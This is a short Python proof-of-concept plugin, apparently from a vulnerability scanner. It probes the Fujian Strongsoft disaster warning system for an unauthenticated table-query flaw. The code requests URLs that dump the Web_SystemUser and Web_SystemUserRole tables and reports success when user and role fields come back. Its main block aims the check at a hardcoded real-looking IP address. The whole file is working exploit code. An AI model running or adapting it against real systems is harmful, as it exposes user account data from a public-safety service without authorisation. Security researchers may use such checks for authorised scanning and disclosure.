#!/usr/bin/env python
# -*- coding: utf-8 -*
# refer: http://www.wooyun.org/bugs/wooyun-2010-077977
# 福建四创灾害预警系统任意数据表查询

def assign(service, arg):
    if service == 'strongsoft':
        return True, arg
        
def audit(arg):
    payload1 = "TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUser"
    payload2 = "TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUserRole"
    vul_url1 = arg + payload1
    vul_url2 = arg + payload2
    code,head,res,_,_ = curl.curl2(vul_url1)
    if "name: 'UserID'" in res and code == 200:
        security_warning(vul_url1)
    code,_,res,_,_ = curl.curl(vul_url2)
    if "name: 'RoleName'" in res and code == 200:
        security_warning(vul_url2)
    

if __name__ == '__main__':
    from dummy import *
    audit(assign('strongsoft','http://183.129.136.54:3050/')[1])